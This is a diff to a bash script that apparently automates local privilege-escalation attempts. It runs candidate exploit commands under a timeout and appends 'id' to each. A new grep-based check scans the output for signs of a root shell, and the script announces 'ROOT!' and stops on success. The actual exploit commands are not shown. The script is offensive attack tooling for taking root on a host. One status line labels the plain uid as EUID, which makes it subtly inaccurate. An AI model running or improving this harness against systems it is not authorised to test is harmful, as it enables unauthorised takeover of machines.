@@ -206,9 +206,17 @@ got_root() {
     echo -e "${GREEN}[+] UID: $(id -u)  EUID: $(id -u)  via: $who${NC}"
     id
     echo ""
+    if [ "$(id -u)" != "0" ]; then
+        echo -e "${YELLOW}[!] script's own uid is not 0, but exploit output reported root.${NC}"
+        echo -e "${YELLOW}[!] verify with: su -c id   |   id   |   ps -u root${NC}"
+    fi
     echo -e "${GREEN}[+] ROOT! Stopping. Clean up: rm -rf $WRK${NC}"
     [ "$CLEANUP" = "1" ] && rm -rf "$WRK"
     exit 0
+}
+
+out_shows_root() {
+    grep -qiE "uid=0\(|euid=0\(|uid=0\b|euid=0\b|root@|you should be root|root shell|got root|#\s+$" "$1" 2>/dev/null
 }
 
 run() {
@@ -216,8 +224,9 @@ run() {
     echo -e "${CYAN}[>] Trying: $name${NC}"
     echo "==== $name :: $cmd ====" >> $LOGFILE
     local OUT=$WRK/.out.$$
+    local RCMD="$cmd; id 2>&1"
     if [ "$HAS_TIMEOUT" = "1" ] && command -v setsid >/dev/null 2>&1; then
-        setsid bash -c "$cmd" </dev/null >"$OUT" 2>&1 &
+        setsid bash -c "$RCMD" </dev/null >"$OUT" 2>&1 &
         local PID=$!
         local S=0
         while kill -0 $PID 2>/dev/null && [ $S -lt 90 ]; do
@@ -234,10 +243,10 @@ run() {
             RC=$?
         fi
     elif [ "$HAS_TIMEOUT" = "1" ]; then
-        timeout -k 5 90 bash -c "$cmd" </dev/null >"$OUT" 2>&1
+        timeout -k 5 90 bash -c "$RCMD" </dev/null >"$OUT" 2>&1
         RC=$?
     else
-        bash -c "$cmd" </dev/null >"$OUT" 2>&1
+        bash -c "$RCMD" </dev/null >"$OUT" 2>&1
         RC=$?
     fi
     if [ "$QUIET" = "0" ]; then
@@ -245,12 +254,13 @@ run() {
     else
         cat "$OUT" >> $LOGFILE
     fi
-    rm -f "$OUT"
-    if [ "$(id -u)" = "0" ]; then
+    if [ "$(id -u)" = "0" ] || out_shows_root "$OUT"; then
+        rm -f "$OUT"
         echo "$name|OK|root" >> $SUM
         echo -e "${GREEN}[+] SUCCESS via: $name${NC}"
         got_root "$name"
     else
+        rm -f "$OUT"
         echo "$name|FAIL|exit=$RC" >> $SUM
         echo -e "${YELLOW}[-] no root (exit code: $RC)${NC}"
         echo ""
